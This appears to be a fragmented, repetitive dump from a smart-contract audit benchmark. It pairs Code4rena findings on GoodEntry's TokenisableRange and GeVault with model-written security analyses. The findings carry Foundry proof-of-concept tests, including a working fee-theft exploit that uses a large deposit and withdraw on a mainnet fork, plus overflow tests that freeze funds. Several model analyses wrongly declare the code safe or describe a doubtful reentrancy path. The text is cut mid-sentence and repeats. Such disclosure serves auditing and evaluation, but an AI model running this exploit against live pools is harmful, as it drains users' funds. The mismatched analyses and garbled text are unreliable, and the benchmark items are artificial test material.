the right state (high value locked in fees, but still no reinvestment happening) a user can maliciously craft a `deposit` and `withdraw` sequence (why not, with flash-loaned assets) to steal most of the fees (`fee0`, `fee1`) held by the pool before distribution.\n\n## Proof of Concept\nBelow is a working PoC that shows under real market conditions how most of the fees (>3% of the pool assets) can be s stolen risk-free by simply depositing and withdrawing a large quantity of liquidity:\n```Solidity\n    function testStolenFeesPoc() public {\n        vm.createSelectFork(\n            \"mainnet\",\n            17811921\n        );\n\n        vm.prank(tokenWhale);\n        USDC.transfer(alice, 100_000e6);\n\n        vm.startPrank(alice);\n        TokenisableRange tr = new TokenisableRange();\n\n        // out of range: WETH is more valuable than that (about 1870 USDC on this block 17811921); \n        // the pool will hold 0 WETH\n        tr.initProxy(AaveOracle, USDC, WETH, 500e10, 1000e10, \"Test1\", \"T1\", false);\n\n        USDC.approve(address(tr), 100_000e6);\n        tr.init(100_000e6, 0);\n\n        // time passes, and the pool trades in range, accumulating fees\n        uint256 fee0 = 1_000e6;\n        uint256 fee1 = 2e18;\n\n        vm.mockCall(address(UniswapV3UsdcNFPositionManager), \n            abi.encodeWithSelector(INonfungiblePositionManager.collect.selector), \n            abi.encode(fee0, fee1));\n\n        vm.stopPrank();\n        vm.startPrank(tokenWhale);\n        USDC.transfer(address(tr), fee0);\n        WETH.transfer(address(tr), fee1);\n\n        // now the price is back to 1870 USDC,\n        // the undistributed fees are 1k USDC and 2 WETH, \n        // in total about $5k or 5% of the pool value \n        // (the percentage can be higher with bigger price swings)\n        // but still, they are not reinvested\n        tr.claimFee();\n        vm.clearMockedCalls();\n        require(tr.fee0() != 0);\n        require(tr.fee1() != 0);\n\n        // an attacker now can flashloan & deposit an amount that will give them\n        // the majority of the pool liquidity, then withdraw for a profit\n        uint256 usdcBalanceBefore = USDC.balanceOf(tokenWhale);\n        uint256 wethBalanceBefore = WETH.balanceOf(tokenWhale);\n        uint256 poolSharesBefore = tr.balanceOf(tokenWhale);\n\n        USDC.approve(address(tr), 10_000_000e6);\n        // this is the hack: we add just a tiny little bit of WETH so TokenisableRange doesn't\n        // count the value locked in fees in assigning the LP tokens\n        WETH.approve(address(tr), 1000);\n        uint256 deposited = tr.deposit(10_000_000e6, 1000);\n        tr.withdraw(deposited, 0, 0);\n\n        // the profit here is\n        // 1 wei of USDC lost, probably to rounding\n        console2.log(int(USDC.balanceOf(tokenWhale)) - int(usdcBalanceBefore)); \n        // 1.58 WETH of profit, which is most of the fees, \n        // and definitely more than 1% of the pool.

Then, it checks if these values are non-zero before proceeding to calculate the treasury fee (`tf0` and `tf1`) and transferring the fees.\n\nTherefore, the vulnerability described in the given knowledge cannot be exploited in this code because the transfer function is called after the fee values have been computed. This ensures that the correct, non-zero fee amounts are transferred to the appropriate recipients.\n\nTo further confirm this, we can attempt to generate a Proof of Concept (PoC) or a patch that would exploit the vulnerability, but this is not possible because the code already follows the correct ordering of operations.",

        "gtraw": "\n# Vulnerability details\n\nThe `TokenisableRange` is designed to always collect trading fees from the Uniswap V3 pool, whenever there is a liquidity event (`deposit` or `withdraw`). These fees may be reinvested in the pool, or may be held in form of `fee0` and `fee1` ERC-20 balance held by the TokenisableRange contract.\n\nWhen a user deposits liquidity in the range, they pay asset tokens, and receive back liquidity tokens, which give them a share of the TokenisableRange assets (liquidity locked in Unisvap V3, plus fee0, and fee1).\n\nTo prevent users from stealing fees, there are several mechanisms in place:\n1. fees are, as said, always collected whenever liquidity is added or removed, and whenever they exceed 1% of the liquidity in the pool, they are re-invested in Uniswap V3. The intention of this check seems to be limiting the value locked in these fees\n2. whenever a user deposits liquidity to the range, the LP tokens given to them are scaled down by the value of the fees, so the participation in fees \"is not given away for free\"\n\nBoth of these mechanisms can however be worked around:\n1. the 1% check is done on the `fee0` and `fee1` **amounts** compared to the theoretical pool amounts, and **not on the total value of the fees** as compared to the total value locked in the pool. This means that when the price changes significantly from when fees were accumulated, the combined value of the fees can exceed, potentially by much, the 1% intended cap, without the reinvestment happening before liquidity events. A malicious user can then monitor and act in such market conditions.\n2. the downscaling of the LP tokens minted to the user happens only if none of the provided liquidity is added to the pool fees instead of the Uniswap V3 position. The user can send just a few wei's of tokens to short-circuit the downscaling, and have a share of fees \"for free\".\n\n## Impact\nGiven a TokenisableRange contract in the right state (high value locked in fees, but still no reinvestment happening) a user can maliciously craft a `deposit` and `withdraw` sequence (why not, with flash-loaned assets) to steal most of the fees (`fee0`, `fee1`) held by the pool before distribution.\n\n## Proof of Concept\nBelow is a working PoC that shows under real market conditions how most of the fees (>3% of the pool assets) can be s stolen risk-free by simply depositing and withdrawing a large quantity of liquidity:\n```Solidity\n    function testStolenFeesPoc() public {\n        vm.createSelectFork(\n            \"mainnet\",\n            17811921\n        );\n\n        vm.prank(tokenWhale);\n        USDC.transfer(alice, 100_000e6);\n\n        vm.startPrank(alice);\n        TokenisableRange tr = new TokenisableRange();\n\n        // out of range: WETH is more valuable than that (about 1870 USDC on this block 17811921); \n        // the pool will hold 0 WETH\n        tr.initProxy(AaveOracle, USDC, WETH, 500e10, 1000e10, \"Test1\", \"T1\", false);\n\n        USDC.approve(address(tr), 100_000e6);\n        tr.init(100_000e6, 0);\n\n        // time passes, and the pool trades in range, accumulating fees\n        uint256 fee0 = 1_000e6;\n        uint256 fee1 = 2e18;\n\n        vm.mockCall(address(UniswapV3UsdcNFPositionManager), \n            abi.encodeWithSelector(INonfungiblePositionManager.collect.selector), \n            abi.encode(fee0, fee1));\n\n        vm.stopPrank();\n        vm.startPrank(tokenWhale);\n        USDC.transfer(address(tr), fee0);\n        WETH.transfer(address(tr), fee1);\n\n        // now the price is back to 1870 USDC,\n        // the undistributed fees are 1k USDC and 2 WETH, \n        // in total about $5k or 5% of the pool value \n        // (the percentage can be higher with bigger price swings)\n        // but still, they are not reinvested\n        tr.claimFee();\n        vm.clearMockedCalls();\n        require(tr.fee0() != 0);\n        require(tr.fee1() != 0);\n\n        // an attacker now can flashloan & deposit an amount that will give them\n        // the majority of the pool liquidity, then withdraw for a profit\n        uint256 usdcBalanceBefore = USDC.balanceOf(tokenWhale);\n        uint256 wethBalanceBefore = WETH.balanceOf(tokenWhale);\n        uint256 poolSharesBefore = tr.balanceOf(tokenWhale);\n\n        USDC.approve(address(tr), 10_000_000e6);\n        // this is the hack: we add just a tiny little bit of WETH so TokenisableRange doesn't\n        // count the value locked in fees in assigning the LP tokens\n        WETH.approve(address(tr), 1000);\n        uint256 deposited = tr.deposit(10_000_000e6, 1000);\n        tr.withdraw(deposited, 0, 0);\n\n        // the profit here is\n        // 1 wei of USDC lost, probably to rounding\n        console2.log(int(USDC.balanceOf(tokenWhale)) - int(usdcBalanceBefore)); \n        // 1.58 WETH of profit, which is most of the fees, \n        // and definitely more than 1% of the pool.

This creates a window during which reentrancy can occur. An attacker could potentially create a malicious contract that receives the ETH and then, during the same transaction, calls back into the `swapTokensForExactETH` function to withdraw ETH again before the initial withdrawal is recorded in the `Swap` event.\n\nTo demonstrate this vulnerability, consider the following PoC:\n\n1. Attacker creates a malicious contract `M` that calls `swapTokensForExactETH` with a carefully crafted `path` to include `M` as an intermediate token.\n2. In `M`, after receiving ETH from `swapTokensForExactETH`, it calls `swapTokensForExactETH` again with a new `path` that includes `M` again, effectively causing a reentrancy attack.\n3. The second call to `swapTokensForExactETH` in `M` withdraws ETH again before the initial withdrawal is recorded in the `Swap` event.\n\nTo prevent this reentrancy attack, the `Swap` event should be emitted after the external call to `weth.withdraw(amountOut)` is made, ensuring that all state changes are completed before the external call is made.

There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer",

There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer",

In particular, the former [is called by the `claimFee()`](https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/TokenisableRange.sol#L187) function, which is always called when  and  liquidity.\n\nThe root cause of this issue is that the FullMath.sol library, [imported from UniswapV3](https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/FullMath.sol) was [altered to build with solidity v0.8.x](https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/lib/FullMath.sol#L2), which has under/overflow protection; the library, however, makes use of these by design, so it won't work properly when compiled in v0.8.0 or later:\n```Solidity\n/// @dev Handles \"phantom overflow\" i.e., allows multiplication and division where an intermediate value overflows 256 bits\nlibrary FullMath {\n```\n\n## Impact\nWhen the fair exchange price of the pool backing the TokenisableRange's falls outside the range (higher side), the `deposit` and `withdraw` will always revert, locking the underlying assets in the pool until the price swings to a different value that does not trigger an under/overflow. If the oracle price stays within this range indefinitely, the funds are permanently locked.\n\n## Proof of Concept\nI'll prove that permanent freezing can happen in two steps:\n- first I'll show one condition where the underflow happens\n- then, I'll set up a fuzz test to prove that given an A and B ticker, we cannot find a market price lower than A such that the underflow does not happen \n\nThe most simple way to prove the first point is by calling `LiquidityAmounts.getAmountsForLiquidity` in isolation with real-world values:\n```solidity\n    function testGetAmountsForLiquidityRevert() public {\n        // real-world value: it's in fact the value returned by\n        // V3_FACTORY.getPool(USDC, WETH, 500).slot0();\n        // at block 17811921; it is around 1870 USDC per WETH\n        uint160 sqrtRatioX96 = 1834502451234584391374419429242405;\n\n        // start price and end corresponding to 1700 to 1800 USDC per WETH\n        uint160 sqrtRatioAX96 = 1866972058592130739290643700340936;\n        uint160 sqrtRatioBX96 = 1921904167735311150677430952623492;\n\n        vm.expectRevert();\n        LiquidityAmounts.getAmountsForLiquidity(sqrtRatioX96, sqrtRatioAX96, sqrtRatioBX96, 1e18);\n    }\n```\n\nHowever, a more integrated test that involves PositionManager can also be considered:\n```\n    function testPocReturnExpectedBalanceUnderflow() public {\n        vm.createSelectFork(\n            \"mainnet\",\n            17811921\n        );\n        vm.startPrank(tokenWhale);\n        TokenisableRange tr = new TokenisableRange();\n        tr.initProxy(AaveOracle, USDC, WETH, 1700e10, 1800e10, \"Test1\", \"T1\", false);\n        USDC.approve(address(tr), 100_000e6);\n        tr.init(100_000e6, 0);\n        vm.expectRevert();\n        tr.returnExpectedBalance(0, 0);\n    }\n```\n\nThen, we can prove the second point with a negative fuzz test:\n```Solidity\n    function testFailPermanentFreeze(uint160 sqrtRatioX96) public {\n        // start & and price, corresponding to 1700 to 1800 USDC per WETH\n        uint160 sqrtRatioAX96 = 1866972058592130739290643700340936;\n        uint160 sqrtRatioBX96 = 1921904167735311150677430952623492;\n\n        // make sure that the market ratio is lower than the lower ticker\n        // that is the range where I first observed the underflow\n        // (WETH above 1800 USDC)\n        sqrtRatioX96 = sqrtRatioX96 % (sqrtRatioAX96 - 1);\n\n        // expect a revert here\n        LiquidityAmounts.getAmountsForLiquidity(sqrtRatioX96, sqrtRatioAX96, sqrtRatioBX96, 1e18);\n    }\n```\n\n## Tools Used\nIDE, Foundry\n\n## Recommended Mitigation Steps\nRestore [the original FullMath.sol library](https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/FullMath.sol) so it compiles with solc versions earlier than 0.8.0.\n\n```Solidity\n// SPDX-License-Identifier: GPL-3.0\n- pragma solidity ^0.8.4;\n+ pragma solidity >=0.4.0 <0.8.0;\n\n/// @title Contains 512-bit math functions\n/// @notice Facilitates multiplication and division that can have overflow of an intermediate value without any loss of precision\n/// @dev Handles \"phantom overflow\" i.e., allows multiplication and division where an intermediate value overflows 256 bits\n```\n\nAnother possible option, which is however not recommended, is to enclose the non-assembly statements of FullMath.sol in an `unchecked` block.\n\n\n\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nUnder/Overflow",

In particular, the former [is called by the `claimFee()`](https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/TokenisableRange.sol#L187) function, which is always called when  and  liquidity.\n\nThe root cause of this issue is that the FullMath.sol library, [imported from UniswapV3](https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/FullMath.sol) was [altered to build with solidity v0.8.x](https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/lib/FullMath.sol#L2), which has under/overflow protection; the library, however, makes use of these by design, so it won't work properly when compiled in v0.8.0 or later:\n```Solidity\n/// @dev Handles \"phantom overflow\" i.e., allows multiplication and division where an intermediate value overflows 256 bits\nlibrary FullMath {\n```\n\n## Impact\nWhen the fair exchange price of the pool backing the TokenisableRange's falls outside the range (higher side), the `deposit` and `withdraw` will always revert, locking the underlying assets in the pool until the price swings to a different value that does not trigger an under/overflow. If the oracle price stays within this range indefinitely, the funds are permanently locked.\n\n## Proof of Concept\nI'll prove that permanent freezing can happen in two steps:\n- first I'll show one condition where the underflow happens\n- then, I'll set up a fuzz test to prove that given an A and B ticker, we cannot find a market price lower than A such that the underflow does not happen \n\nThe most simple way to prove the first point is by calling `LiquidityAmounts.getAmountsForLiquidity` in isolation with real-world values:\n```solidity\n    function testGetAmountsForLiquidityRevert() public {\n        // real-world value: it's in fact the value returned by\n        // V3_FACTORY.getPool(USDC, WETH, 500).slot0();\n        // at block 17811921; it is around 1870 USDC per WETH\n        uint160 sqrtRatioX96 = 1834502451234584391374419429242405;\n\n        // start price and end corresponding to 1700 to 1800 USDC per WETH\n        uint160 sqrtRatioAX96 = 1866972058592130739290643700340936;\n        uint160 sqrtRatioBX96 = 1921904167735311150677430952623492;\n\n        vm.expectRevert();\n        LiquidityAmounts.getAmountsForLiquidity(sqrtRatioX96, sqrtRatioAX96, sqrtRatioBX96, 1e18);\n    }\n```\n\nHowever, a more integrated test that involves PositionManager can also be considered:\n```\n    function testPocReturnExpectedBalanceUnderflow() public {\n        vm.createSelectFork(\n            \"mainnet\",\n            17811921\n        );\n        vm.startPrank(tokenWhale);\n        TokenisableRange tr = new TokenisableRange();\n        tr.initProxy(AaveOracle, USDC, WETH, 1700e10, 1800e10, \"Test1\", \"T1\", false);\n        USDC.approve(address(tr), 100_000e6);\n        tr.init(100_000e6, 0);\n        vm.expectRevert();\n        tr.returnExpectedBalance(0, 0);\n    }\n```\n\nThen, we can prove the second point with a negative fuzz test:\n```Solidity\n    function testFailPermanentFreeze(uint160 sqrtRatioX96) public {\n        // start & and price, corresponding to 1700 to 1800 USDC per WETH\n        uint160 sqrtRatioAX96 = 1866972058592130739290643700340936;\n        uint160 sqrtRatioBX96 = 1921904167735311150677430952623492;\n\n        // make sure that the market ratio is lower than the lower ticker\n        // that is the range where I first observed the underflow\n        // (WETH above 1800 USDC)\n        sqrtRatioX96 = sqrtRatioX96 % (sqrtRatioAX96 - 1);\n\n        // expect a revert here\n        LiquidityAmounts.getAmountsForLiquidity(sqrtRatioX96, sqrtRatioAX96, sqrtRatioBX96, 1e18);\n    }\n```\n\n## Tools Used\nIDE, Foundry\n\n## Recommended Mitigation Steps\nRestore [the original FullMath.sol library](https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/FullMath.sol) so it compiles with solc versions earlier than 0.8.0.\n\n```Solidity\n// SPDX-License-Identifier: GPL-3.0\n- pragma solidity ^0.8.4;\n+ pragma solidity >=0.4.0 <0.8.0;\n\n/// @title Contains 512-bit math functions\n/// @notice Facilitates multiplication and division that can have overflow of an intermediate value without any loss of precision\n/// @dev Handles \"phantom overflow\" i.e., allows multiplication and division where an intermediate value overflows 256 bits\n```\n\nAnother possible option, which is however not recommended, is to enclose the non-assembly statements of FullMath.sol in an `unchecked` block.\n\n\n\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nUnder/Overflow",

If the oracle price stays within this range indefinitely, the funds are permanently locked.\n\n## Proof of Concept\nI'll prove that permanent freezing can happen in two steps:\n- first I'll show one condition where the underflow happens\n- then, I'll set up a fuzz test to prove that given an A and B ticker, we cannot find a market price lower than A such that the underflow does not happen \n\nThe most simple way to prove the first point is by calling `LiquidityAmounts.getAmountsForLiquidity` in isolation with real-world values:\n```solidity\n    function testGetAmountsForLiquidityRevert() public {\n        // real-world value: it's in fact the value returned by\n        // V3_FACTORY.getPool(USDC, WETH, 500).slot0();\n        // at block 17811921; it is around 1870 USDC per WETH\n        uint160 sqrtRatioX96 = 1834502451234584391374419429242405;\n\n        // start price and end corresponding to 1700 to 1800 USDC per WETH\n        uint160 sqrtRatioAX96 = 1866972058592130739290643700340936;\n        uint160 sqrtRatioBX96 = 1921904167735311150677430952623492;\n\n        vm.expectRevert();\n        LiquidityAmounts.getAmountsForLiquidity(sqrtRatioX96, sqrtRatioAX96, sqrtRatioBX96, 1e18);\n    }\n```\n\nHowever, a more integrated test that involves PositionManager can also be considered:\n```\n    function testPocReturnExpectedBalanceUnderflow() public {\n        vm.createSelectFork(\n            \"mainnet\",\n            17811921\n        );\n        vm.startPrank(tokenWhale);\n        TokenisableRange tr = new TokenisableRange();\n        tr.initProxy(AaveOracle, USDC, WETH, 1700e10, 1800e10, \"Test1\", \"T1\", false);\n        USDC.approve(address(tr), 100_000e6);\n        tr.init(100_000e6, 0);\n        vm.expectRevert();\n        tr.returnExpectedBalance(0, 0);\n    }\n```\n\nThen, we can prove the second point with a negative fuzz test:\n```Solidity\n    function testFailPermanentFreeze(uint160 sqrtRatioX96) public {\n        // start & and price, corresponding to 1700 to 1800 USDC per WETH\n        uint160 sqrtRatioAX96 = 1866972058592130739290643700340936;\n        uint160 sqrtRatioBX96 = 1921904167735311150677430952623492;\n\n        // make sure that the market ratio is lower than the lower ticker\n        // that is the range where I first observed the underflow\n        // (WETH above 1800 USDC)\n        sqrtRatioX96 = sqrtRatioX96 % (sqrtRatioAX96 - 1);\n\n        // expect a revert here\n        LiquidityAmounts.getAmountsForLiquidity(sqrtRatioX96, sqrtRatioAX96, sqrtRatioBX96, 1e18);\n    }\n```\n\n## Tools Used\nIDE, Foundry\n\n## Recommended Mitigation Steps\nRestore [the original FullMath.sol library](https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/FullMath.sol) so it compiles with solc versions earlier than 0.8.0.\n\n```Solidity\n// SPDX-License-Identifier: GPL-3.0\n- pragma solidity ^0.8.4;\n+ pragma solidity >=0.4.0 <0.8.0;\n\n/// @title Contains 512-bit math functions\n/// @notice Facilitates multiplication and division that can have overflow of an intermediate value without any loss of precision\n/// @dev Handles \"phantom overflow\" i.e., allows multiplication and division where an intermediate value overflows 256 bits\n```\n\nAnother possible option, which is however not recommended, is to enclose the non-assembly statements of FullMath.sol in an `unchecked` block.\n\n\n\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nUnder/Overflow",

The function `withdraw` calculates the `removedLiquidity` proportionally based on the user's liquidity tokens (`lp`) and the total supply. This ensures that users receive their correct share of the liquidity pool when they burn their liquidity tokens.\n2. The `POS_MGR.decreaseLiquidity` function call updates the pool's liquidity, and the `POS_MGR.collect` function call distributes fees to the user who calls the `withdraw` function.\n3.

The `_burn` function call and the `Withdraw` event ensure that the user's liquidity tokens are burned and updated correctly in the contract.\n\nOverall, the smart contract function properly calculates the user's share of the liquidity pool and distributes fees based on their contribution, preventing attackers from stealing unclaimed yields.",

If the oracle price stays within this range indefinitely, the funds are permanently locked.\n\n## Proof of Concept\nI'll prove that permanent freezing can happen in two steps:\n- first I'll show one condition where the underflow happens\n- then, I'll set up a fuzz test to prove that given an A and B ticker, we cannot find a market price lower than A such that the underflow does not happen \n\nThe most simple way to prove the first point is by calling `LiquidityAmounts.getAmountsForLiquidity` in isolation with real-world values:\n```solidity\n    function testGetAmountsForLiquidityRevert() public {\n        // real-world value: it's in fact the value returned by\n        // V3_FACTORY.getPool(USDC, WETH, 500).slot0();\n        // at block 17811921; it is around 1870 USDC per WETH\n        uint160 sqrtRatioX96 = 1834502451234584391374419429242405;\n\n        // start price and end corresponding to 1700 to 1800 USDC per WETH\n        uint160 sqrtRatioAX96 = 1866972058592130739290643700340936;\n        uint160 sqrtRatioBX96 = 1921904167735311150677430952623492;\n\n        vm.expectRevert();\n        LiquidityAmounts.getAmountsForLiquidity(sqrtRatioX96, sqrtRatioAX96, sqrtRatioBX96, 1e18);\n    }\n```\n\nHowever, a more integrated test that involves PositionManager can also be considered:\n```\n    function testPocReturnExpectedBalanceUnderflow() public {\n        vm.createSelectFork(\n            \"mainnet\",\n            17811921\n        );\n        vm.startPrank(tokenWhale);\n        TokenisableRange tr = new TokenisableRange();\n        tr.initProxy(AaveOracle, USDC, WETH, 1700e10, 1800e10, \"Test1\", \"T1\", false);\n        USDC.approve(address(tr), 100_000e6);\n        tr.init(100_000e6, 0);\n        vm.expectRevert();\n        tr.returnExpectedBalance(0, 0);\n    }\n```\n\nThen, we can prove the second point with a negative fuzz test:\n```Solidity\n    function testFailPermanentFreeze(uint160 sqrtRatioX96) public {\n        // start & and price, corresponding to 1700 to 1800 USDC per WETH\n        uint160 sqrtRatioAX96 = 1866972058592130739290643700340936;\n        uint160 sqrtRatioBX96 = 1921904167735311150677430952623492;\n\n        // make sure that the market ratio is lower than the lower ticker\n        // that is the range where I first observed the underflow\n        // (WETH above 1800 USDC)\n        sqrtRatioX96 = sqrtRatioX96 % (sqrtRatioAX96 - 1);\n\n        // expect a revert here\n        LiquidityAmounts.getAmountsForLiquidity(sqrtRatioX96, sqrtRatioAX96, sqrtRatioBX96, 1e18);\n    }\n```\n\n## Tools Used\nIDE, Foundry\n\n## Recommended Mitigation Steps\nRestore [the original FullMath.sol library](https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/FullMath.sol) so it compiles with solc versions earlier than 0.8.0.\n\n```Solidity\n// SPDX-License-Identifier: GPL-3.0\n- pragma solidity ^0.8.4;\n+ pragma solidity >=0.4.0 <0.8.0;\n\n/// @title Contains 512-bit math functions\n/// @notice Facilitates multiplication and division that can have overflow of an intermediate value without any loss of precision\n/// @dev Handles \"phantom overflow\" i.e., allows multiplication and division where an intermediate value overflows 256 bits\n```\n\nAnother possible option, which is however not recommended, is to enclose the non-assembly statements of FullMath.sol in an `unchecked` block.\n\n\n\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nUnder/Overflow",

Functionality: The `deposit` function allows users to deposit specific amounts of two tokens (`TOKEN0` and `TOKEN1`) into a contract, calculates the fees, and mints liquidity provider (LP) tokens representing the user's share in the pool.\n2. Authorization: The function uses `transferFrom` to move tokens from the user's wallet to the contract. This function requires allowance, which is set up via `TOKENS.token.safeIncreaseAllowance(address(POS_MGR), n0)` and `TOKENS.token.safeIncreaseAllowance(address(POS_MGR), n1)`. The contract only moves tokens if the user has previously granted allowance, ensuring that the contract cannot move tokens without user authorization.\n3. No user-provided 'from' address: The `transferFrom` function takes 'from' and 'to' addresses as arguments, but in this contract, the 'from' address is not user-provided input. Instead, it is always the `msg.sender`, which is the user executing the transaction. This ensures that tokens can only be moved from the user's wallet and not from any arbitrary address.\n\nIn conclusion, the `deposit` function is not vulnerable to the \"Unrestricted Direct Token Transfers with Absent Access Controls\" vulnerability, as it requires user authorization and does not use user-provided 'from' addresses for token transfers.",

Therefore, the function does not allow arbitrary token transfers directly from a user's wallet to another user's wallet without proper authorization.\n\nAdditionally, the function has other access controls in place, such as the `nonReentrant` modifier, which prevents the function from being called again while it is still executing, and the `require` statement, which checks that the total supply is greater than zero before allowing the function to execute.

        "gt": "\n# Vulnerability details\n\nThe `TokenisableRange` is designed to always collect trading fees from the Uniswap V3 pool, whenever there is a liquidity event (`deposit` or `withdraw`). These fees may be reinvested in the pool, or may be held in form of `fee0` and `fee1` ERC-20 balance held by the TokenisableRange contract.\n\nWhen a user deposits liquidity in the range, they pay asset tokens, and receive back liquidity tokens, which give them a share of the TokenisableRange assets (liquidity locked in Unisvap V3, plus fee0, and fee1).\n\nTo prevent users from stealing fees, there are several mechanisms in place:\n1. fees are, as said, always collected whenever liquidity is added or removed, and whenever they exceed 1% of the liquidity in the pool, they are re-invested in Uniswap V3. The intention of this check seems to be limiting the value locked in these fees\n2. whenever a user deposits liquidity to the range, the LP tokens given to them are scaled down by the value of the fees, so the participation in fees \"is not given away for free\"\n\nBoth of these mechanisms can however be worked around:\n1. the 1% check is done on the `fee0` and `fee1` **amounts** compared to the theoretical pool amounts, and **not on the total value of the fees** as compared to the total value locked in the pool. This means that when the price changes significantly from when fees were accumulated, the combined value of the fees can exceed, potentially by much, the 1% intended cap, without the reinvestment happening before liquidity events. A malicious user can then monitor and act in such market conditions.\n2. the downscaling of the LP tokens minted to the user happens only if none of the provided liquidity is added to the pool fees instead of the Uniswap V3 position. The user can send just a few wei's of tokens to short-circuit the downscaling, and have a share of fees \"for free\".\n\n## Impact\nGiven a TokenisableRange contract in the right state (high value locked in fees, but still no reinvestment happening) a user can maliciously craft a `deposit` and `withdraw` sequence (why not, with flash-loaned assets) to steal most of the fees (`fee0`, `fee1`) held by the pool before distribution.\n\n## Proof of Concept\nBelow is a working PoC that shows under real market conditions how most of the fees (>3% 